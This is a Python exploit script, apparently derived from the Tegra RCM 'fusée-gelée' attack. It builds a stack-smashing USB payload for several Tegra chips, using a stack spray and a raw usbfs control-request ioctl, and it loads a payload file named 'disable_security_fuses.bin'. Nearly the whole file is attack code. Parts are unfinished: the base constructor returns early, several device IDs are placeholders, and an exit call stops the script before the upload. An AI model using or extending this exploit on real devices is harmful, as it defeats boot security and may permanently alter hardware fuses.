#!/usr/bin/env python3

import os
import sys
import errno
import ctypes
import argparse
import platform

IRAM_END = 0x40040000
USB_XFER_MAX = 0x1000

RCM_V1_HEADER_SIZE = 116
RCM_V35_HEADER_SIZE = 628
RCM_V40_HEADER_SIZE = 644
RCM_V4P_HEADER_SIZE = 680


class HaxBackend:
    """
    Base class for backends for the TegraRCM vuln.
    """

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    STANDARD_REQUEST_DEVICE_TO_HOST   = 0x80
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Interface requests
    GET_STATUS        = 0x0

    # List of OSs this class supports.
    SUPPORTED_SYSTEMS = []

    def __init__(self, skip_checks=False):
        """ Sets up the backend for the given device. """
        self.skip_checks = skip_checks


    def trigger_vulnerability(self, length):
        """
        Triggers the actual controlled memcpy.
        The actual trigger needs to be executed carefully, as different host OSs
        require us to ask for our invalid control request differently.
        """
        raise NotImplementedError("Trying to use an abstract backend rather than an instance of the proper subclass!")


    @classmethod
    def supported(cls, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """

        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system in cls.SUPPORTED_SYSTEMS


    @classmethod
    def create_appropriate_backend(cls, system_override=None, skip_checks=False):
        """ Creates a backend object appropriate for the current OS. """

        # Search for a supportive backend, and try to create one.
        for subclass in cls.__subclasses__():
            if subclass.supported(system_override):
                return subclass(skip_checks=skip_checks)

        # ... if we couldn't, bail out.
        raise IOError("No backend to trigger the vulnerability-- it's likely we don't support your OS!")


    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return bytes(self.dev.read(0x81, length, 3000))


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be USB_XFER_MAX long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        return self.dev.write(0x01, data, 3000)


    def find_device(self, vid=None, pid=None):
        """ Set and return the device to be used """

        import usb

        self.dev = usb.core.find(idVendor=vid, idProduct=pid)
        return self.dev


class LinuxBackend(HaxBackend):
    """
    More complex vulnerability trigger for Linux: we can't go through libusb,
    as it limits control requests to a single page size, the limitation expressed
    by the usbfs. More realistically, the usbfs seems fine with it, and we just
    need to work around libusb.
    """

    BACKEND_NAME = "Linux"
    SUPPORTED_SYSTEMS = ['Linux', 'linux']
    SUPPORTED_USB_CONTROLLERS = ['pci/drivers/xhci_hcd', 'platform/drivers/dwc_otg']

    SETUP_PACKET_SIZE = 8

    IOCTL_IOR   = 0x80000000
    IOCTL_TYPE  = ord('U')
    IOCTL_NR_SUBMIT_URB = 10

    URB_CONTROL_REQUEST = 2

    class SubmitURBIoctl(ctypes.Structure):
        _fields_ = [
            ('type',          ctypes.c_ubyte),
            ('endpoint',      ctypes.c_ubyte),
            ('status',        ctypes.c_int),
            ('flags',         ctypes.c_uint),
            ('buffer',        ctypes.c_void_p),
            ('buffer_length', ctypes.c_int),
            ('actual_length', ctypes.c_int),
            ('start_frame',   ctypes.c_int),
            ('stream_id',     ctypes.c_uint),
            ('error_count',   ctypes.c_int),
            ('signr',         ctypes.c_uint),
            ('usercontext',   ctypes.c_void_p),
        ]


    def trigger_vulnerability(self, length):
        """
        Submit the control request directly using the USBFS submit_urb
        ioctl, which issues the control request directly. This allows us
        to send our giant control request despite size limitations.
        """

        import os
        import fcntl

        # We only work for devices that are bound to a compatible HCD.
        self._validate_environment()

        # Figure out the USB device file we're going to use to issue the
        # control request.
        fd = os.open('/dev/bus/usb/{:0>3d}/{:0>3d}'.format(self.dev.bus, self.dev.address), os.O_RDWR)

        # Define the setup packet to be submitted.
        setup_packet = \
            int.to_bytes(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, 1, byteorder='little') + \
            int.to_bytes(self.GET_STATUS,                                  1, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(length,                                           2, byteorder='little')

        # Create a buffer to hold the result.
        buffer_size = self.SETUP_PACKET_SIZE + length
        buffer = ctypes.create_string_buffer(setup_packet, buffer_size)

        # Define the data structure used to issue the control request URB.
        request = self.SubmitURBIoctl()
        request.type          = self.URB_CONTROL_REQUEST
        request.endpoint      = 0
        request.buffer        = ctypes.addressof(buffer)
        request.buffer_length = buffer_size

        # Manually submit an URB to the kernel, so it issues our 'evil' control request.
        ioctl_number = (self.IOCTL_IOR | ctypes.sizeof(request) << 16 | ord('U') << 8 | self.IOCTL_NR_SUBMIT_URB)
        fcntl.ioctl(fd, ioctl_number, request, True)

        # Close our newly created fd.
        os.close(fd)

        # The other modules raise an IOError when the control request fails to complete. We don't fail out (as we don't bother
        # reading back), so we'll simulate the same behavior as the others.
        raise IOError("Raising an error to match the others!")


    def _validate_environment(self):
        """
        We can only inject giant control requests on devices that are backed
        by certain usb controllers-- typically, the xhci_hcd on most PCs.
        """

        from glob import glob

        # If we're overriding checks, never fail out.
        if self.skip_checks:
            print("skipping checks")
            return

        # Search each device bound to the xhci_hcd driver for the active device...
        for hci_name in self.SUPPORTED_USB_CONTROLLERS:
            for path in glob("/sys/bus/{}/*/usb*".format(hci_name)):
                if self._node_matches_our_device(path):
                    return

        raise ValueError("This device needs to be on a supported backend. Usually that means plugged into a blue/USB 3.0 port!\nBailing out.")


    def _node_matches_our_device(self, path):
        """
        Checks to see if the given sysfs node matches our given device.
        Can be used to check if an xhci_hcd controller subnode reflects a given device.,
        """

        # If this isn't a valid USB device node, it's not what we're looking for.
        if not os.path.isfile(path + "/busnum"):
            return False

        # We assume that a whole _bus_ is associated with a host controller driver, so we
        # only check for a matching bus ID.
        if self.dev.bus != self._read_num_file(path + "/busnum"):
            return False

        # If all of our checks passed, this is our device.
        return True


    def _read_num_file(self, path):
        """
        Reads a numeric value from a sysfs file that contains only a number.
        """

        with open(path, 'r') as f:
            raw = f.read()
            return int(raw)


class RCMHax:

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        """ Set up our RCM hack connection."""

        return

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Keep track of the total amount written.
        self.total_written = 0

        # Create a vulnerability backend for the given device.
        try:
            self.backend = HaxBackend.create_appropriate_backend(system_override=os_override, skip_checks=override_checks)
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            sys.exit(-1)

        # Grab a connection to the USB device itself.
        self.dev = self._find_device(vid, pid)

        # If we don't have a device...
        if self.dev is None:

            # ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device:
                print("Waiting for a TegraRCM device to come online...")
                while self.dev is None:
                    self.dev = self._find_device(vid, pid)

            # ... or bail out.
            else:
                raise IOError("No TegraRCM device found?")

        # Notify the user of which backend we're using.
        print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def _find_device(self, vid=None, pid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID. """

        # Apply our default VID and PID if neither are provided...
        vid = vid if vid else self.DEFAULT_VID
        pid = pid if pid else self.DEFAULT_PID

        # ... and use them to find a USB device.
        return self.backend.find_device(vid, pid)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.backend.read(length)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = USB_XFER_MAX

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be USB_XFER_MAX long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.backend.write_single_buffer(data)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            self.write(b'\0' * USB_XFER_MAX)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address() #- 0x20 # This isn't needed hopefully

        return self.backend.trigger_vulnerability(length)


    def create_rcm_message(self):
######## RCM HEADER ############################################################
        # The max payload size depends on the address of the RCM Payload buffer
        # Add the RCM header size to USB transfer size.
        # Substract 16. IDK they all do it. Test without it.
        rcm_payload_length  = (IRAM_END - self.RCM_PAYLOAD_ADDR) + self.RCM_HEADER_SIZE - 16
        rcm_header = rcm_payload_length.to_bytes(4, byteorder='little')
        # Fill up the RCM header to RCM_HEADER_SIZE otherwise the start of the payload is copied to the RCM command buffer
        rcm_header += b'\0' * (self.RCM_HEADER_SIZE - len(rcm_header))

######## INTERMEZZO ############################################################
        # This is the start of the RCM payload buffer.
        intermezzo_path = "./intermezzo.bin"
        with open(intermezzo_path, "rb") as f:
            intermezzo      = f.read()
            rcm_payload     = intermezzo

######## PAD UNTIL PAYLOAD ADDRESS #############################################
        # Payload should start at a fixed offset so pad until that offset.
        padding_size = self.PAYLOAD_START_OFF - len(rcm_payload)
        padding = b'\0' * padding_size
        rcm_payload += padding

######## PAYLOAD ###############################################################
        # The RCM payload needs to contain the stackspray and therefore the actual payload eventually needs to be splitted.
        # Intermezzo will concat it back together
        payload_part1_max_size = self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1] - self.PAYLOAD_START_OFF
        payload_part2_max_size = (IRAM_END - self.RCM_PAYLOAD_ADDR) - (self.STACK_SPRAY_END - self.COPY_BUFFER_ADDRESSES[1])

        payload_path = "./disable_security_fuses.bin"
        with open(payload_path, "rb") as f:
            payload      = f.read()

        # Check if payload fits in the available space
        print(payload_part1_max_size)
        print(payload_part2_max_size)
        print(payload_part1_max_size+payload_part2_max_size)
        assert(len(payload) < (payload_part1_max_size+payload_part2_max_size))

        # append first part of payload if payload is larger than the available buffer
        payload_size = min(payload_part1_max_size, len(payload))
        rcm_payload += payload[:payload_size]

######## PAD UNTIL STACK SPRAY ADDRESS #########################################
        padding_size = (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload) #+ self.RCM_HEADER_SIZE
        padding = b'\0' * padding_size
        rcm_payload += padding

######## STACK SPRAY ADDRESS ###################################################
        repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
        stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
        rcm_payload += stack_spray

######## APPEND 2nd PART OF PAYLOAD ############################################
        if len(payload) - payload_part1_max_size > 0:
            rcm_payload += payload[payload_size:]

######## PAD TO MAX TRANSFER SIZE ##############################################
        # Pad the payload to fill a USB request exactly, so we don't send a short
        # packet and break out of the RCM loop.
        payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USb buffer.
        if (payload_length % USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
            padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
            rcm_payload += (b'\0' * padding_size)

        rcm_message = rcm_header + rcm_payload

        # debug
        rcm_payload = open("rcm_message.bin", "wb")
        rcm_payload.write(rcm_message)
        rcm_payload = open("rcm_header.bin", "wb")
        rcm_payload.write(rcm_header)
        rcm_payload = open("rcm_payload.bin", "wb")
        rcm_payload.write(rcm_payload)
        
        return rcm_message

class T20(RCMHax):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        # Default to T30 RCM VID and PID.
        self.DEFAULT_VID = 0x0955
        self.DEFAULT_PID = 0x0000 #fill me

        self.RCM_HEADER_SIZE  = RCM_V1_HEADER_SIZE
        self.RCM_PAYLOAD_ADDR = 0x40008000

        self.COPY_BUFFER_ADDRESSES   = [0, 0x40005000] # Lower Buffer doesn't matter

        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
        self.STACK_SPRAY_END     = self.STACK_END
        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # 512 Byte should be enough? #0x40009E40

        # The address where the user payload is expected to begin.
        # A reasonable offset allows Intermezzo to grow without problems
        self.PAYLOAD_START_OFF  = 0xE40

        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)

class T30(RCMHax):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        # Default to T30 RCM VID and PID.
        self.DEFAULT_VID = 0x0955
        # SURFACE_RT_PID 0x7130
        # NEXUS7_PID 0x7330
        self.DEFAULT_PID = 0x7130

        self.RCM_HEADER_SIZE  = RCM_V1_HEADER_SIZE
        self.RCM_PAYLOAD_ADDR = 0x4000A000

        self.COPY_BUFFER_ADDRESSES   = [0, 0x40005000] # Lower Buffer doesn't matter

        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
        self.STACK_SPRAY_END     = self.RCM_PAYLOAD_ADDR - 420 # exact position is known.
        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 4 # 512 Byte should be enough? #0x40009E40

        # The address where the user payload is expected to begin.
        # A reasonable offset allows Intermezzo to grow without problems
        self.PAYLOAD_START_OFF  = 0xE40

        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)

class T114(RCMHax):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        # Default to T30 RCM VID and PID.
        self.DEFAULT_VID = 0x0955
        # SURFACE_2_PID 0x7335
        self.DEFAULT_PID = 0x7335

        self.RCM_HEADER_SIZE  = RCM_V35_HEADER_SIZE
        self.RCM_PAYLOAD_ADDR = 0x4000E000

        self.COPY_BUFFER_ADDRESSES   = [0, 0x40008000] # Lower Buffer doesn't matter

        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
        self.STACK_SPRAY_END     = self.STACK_END
        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # 512 Byte should be enough? #0x40009E40

        # The address where the user payload is expected to begin.
        # A reasonable offset allows Intermezzo to grow without problems
        self.PAYLOAD_START_OFF  = 0xE40 #+3648

        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)

class T124(RCMHax):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        # Default to T30 RCM VID and PID.
        self.DEFAULT_VID = 0x0955
        # JETSON_TK1_PID 0x7140
        # SHIELD_TK1_PID 0x7f40
        self.DEFAULT_PID = 0x0000 # fill me

        self.RCM_HEADER_SIZE  = RCM_V40_HEADER_SIZE
        self.RCM_PAYLOAD_ADDR = 0x4000E000

        self.COPY_BUFFER_ADDRESSES   = [0, 0x40008000] # Lower Buffer doesn't matter

        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
        self.STACK_SPRAY_END     = self.STACK_END
        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # Might not be enough

        # The address where the user payload is expected to begin.
        # A reasonable offset allows Intermezzo to grow without problems
        self.PAYLOAD_START_OFF  = 0xE40 #+3648

        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)

class T132(RCMHax):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        # Default to T30 RCM VID and PID.
        self.DEFAULT_VID = 0x0955
        # NEXUS9__PID 0x7F13
        self.DEFAULT_PID = 0x0000 # fill me

        self.RCM_HEADER_SIZE  = RCM_V40_HEADER_SIZE
        self.RCM_PAYLOAD_ADDR = 0x4000F000

        self.COPY_BUFFER_ADDRESSES   = [0, 0x40008000] # Lower Buffer doesn't matter

        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
        self.STACK_SPRAY_END     = self.STACK_END
        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # Might not be enough

        # The address where the user payload is expected to begin.
        # A reasonable offset allows Intermezzo to grow without problems
        self.PAYLOAD_START_OFF  = 0xE40 #+3648

        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)

class T210(RCMHax):

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        # Default to T30 RCM VID and PID.
        self.DEFAULT_VID = 0x0955
        # SWITCH_TX1_PID 0x7321
        self.DEFAULT_PID = 0x0000 # fill me

        self.RCM_HEADER_SIZE  = RCM_V4P_HEADER_SIZE
        self.RCM_PAYLOAD_ADDR = 0x40010000

        self.COPY_BUFFER_ADDRESSES   = [0, 0x40009000] # Lower Buffer doesn't matter

        self.STACK_END           = self.RCM_PAYLOAD_ADDR  
        self.STACK_SPRAY_END     = self.STACK_END
        self.STACK_SPRAY_START   = self.STACK_SPRAY_END - 0x200 # Might not be enough

        # The address where the user payload is expected to begin.
        # A reasonable offset allows Intermezzo to grow without problems
        self.PAYLOAD_START_OFF  = 0xE40 #+3648

        RCMHax.__init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False)

# Get a connection to our device.
try:
    switch = T30()
except IOError as e:
    print(e)
    sys.exit(-1)

# Print the device's ID. Note that reading the device's ID is necessary to get it into
#try:
#    device_id = switch.read_device_id()
#    print("Found a Tegra with Device ID: {}".format(device_id))
#except OSError as e:
#    # Raise the exception only if we're not being permissive about ID reads.
#    raise e

rcm_message = switch.create_rcm_message()

exit(0)

# Send the constructed payload, which contains the command, the stack smashing
# values, the Intermezzo relocation stub, and the final payload.
print("Uploading payload...")
switch.write(rcm_message)

# The RCM backend alternates between two different DMA buffers. Ensure we're
# about to DMA into the higher one, so we have less to copy during our attack.
switch.switch_to_highbuf()

# Smash the device's stack, triggering the vulnerability.
print("Smashing the stack...")
try:
    switch.trigger_controlled_memcpy()
except ValueError as e:
    print(str(e))
except IOError:
    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
    print("Launch complete!")

